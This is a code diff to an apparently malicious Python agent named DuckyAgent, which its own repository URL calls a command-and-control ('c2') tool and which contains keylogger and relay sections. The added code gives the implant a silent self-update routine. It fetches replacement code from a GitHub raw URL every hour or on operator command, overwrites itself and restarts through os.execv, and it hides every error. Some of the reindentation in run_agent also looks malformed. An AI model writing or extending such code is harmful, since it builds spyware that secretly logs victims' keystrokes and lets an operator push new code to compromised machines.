@@ -56,6 +56,10 @@ MAX_LOG_AGE_DAYS = 7           # Delete log files older than this
 # HTTP server settings (for local access)
 LOCAL_PORT = 8081
 
+# Auto-update settings
+UPDATE_CHECK_INTERVAL = 3600   # Check for updates every hour
+AGENT_URL = "https://raw.githubusercontent.com/tymamana1/duckyagent-c2/main/ducky_agent.py"
+
 
 # ── Initialization ──────────────────────────────────────────────
 
@@ -136,6 +140,55 @@ class GitHubRelay:
             urlopen(req, timeout=10)
         except Exception:
             pass  # Silently fail - agent keeps running
+
+
+# ── Auto-Update System ─────────────────────────────────────────
+
+def check_for_updates():
+    """Check GitHub for newer version and download if available."""
+    try:
+        local_path = os.path.join(CONFIG_DIR, "ducky_agent.py")
+        
+        # Get remote file hash
+        req = Request(AGENT_URL, headers={"User-Agent": "DuckyAgent/1.0"})
+        with urlopen(req, timeout=15) as resp:
+            remote_content = resp.read()
+            remote_hash = hashlib.sha256(remote_content).hexdigest()
+        
+        # Get local file hash
+        if os.path.exists(local_path):
+            with open(local_path, 'rb') as f:
+                local_hash = hashlib.sha256(f.read()).hexdigest()
+            
+            if local_hash == remote_hash:
+                return False  # Already up to date
+        
+        # Download new version
+        backup_path = local_path + ".bak"
+        if os.path.exists(local_path):
+            import shutil
+            shutil.copy2(local_path, backup_path)
+        
+        with open(local_path, 'wb') as f:
+            f.write(remote_content)
+        
+        return True  # Updated successfully
+        
+    except Exception:
+        return False
+
+
+def auto_update_loop():
+    """Background thread that periodically checks for updates."""
+    while True:
+        time.sleep(UPDATE_CHECK_INTERVAL)
+        try:
+            updated = check_for_updates()
+            if updated:
+                # Restart agent with new code
+                os.execv(sys.executable, [sys.executable] + sys.argv)
+        except Exception:
+            pass  # Silently continue
 
 
 # ── Smart Keylogger ─────────────────────────────────────────────
@@ -660,6 +713,19 @@ class CommandHandler:
                 "keylogger_running": self.keylogger.running if hasattr(self, 'keylogger') else False,
             }
 
+        # ── Update Agent ──────────────────────────────────────
+        elif cmd == "update" or cmd == "upgrade":
+            try:
+                updated = check_for_updates()
+                if updated:
+                    resp = {"status": "updated", "message": "New version downloaded. Restarting..."}
+                    # Schedule restart after response is sent
+                    threading.Timer(2, lambda: os.execv(sys.executable, [sys.executable] + sys.argv)).start()
+                else:
+                    resp = {"status": "current", "message": "Already running latest version"}
+            except Exception as e:
+                resp = {"error": str(e)}
+
         # ── Unknown command ───────────────────────────────────
         else:
             resp = {"error": f"Unknown command: {command}",
@@ -923,16 +989,20 @@ def run_agent():
 
     poll_interval = float(config.get("agent", "poll_interval", fallback=str(POLL_INTERVAL)))
 
-    # Start local HTTP server (for local access)
-    local_port = int(config.get("agent", "local_port", fallback=str(LOCAL_PORT)))
-    http_server = None
-    try:
-        httpd = HTTPServer(("127.0.0.1", local_port), AgentHTTPHandler)
-        http_thread = threading.Thread(target=httpd.serve_forever, daemon=True)
-        http_thread.start()
-        http_server = httpd
-    except OSError as e:
-        pass  # Port already in use - that's fine
+        # Start local HTTP server (for local access)
+        local_port = int(config.get("agent", "local_port", fallback=str(LOCAL_PORT)))
+        http_server = None
+        try:
+            httpd = HTTPServer(("127.0.0.1", local_port), AgentHTTPHandler)
+            http_thread = threading.Thread(target=httpd.serve_forever, daemon=True)
+            http_thread.start()
+            http_server = httpd
+        except OSError as e:
+            pass  # Port already in use - that's fine
+
+        # Start auto-update thread (checks every hour)
+        update_thread = threading.Thread(target=auto_update_loop, daemon=True)
+        update_thread.start()
 
     print(f"DuckyAgent v1.0 started (PID: {os.getpid()})")
     if http_server:
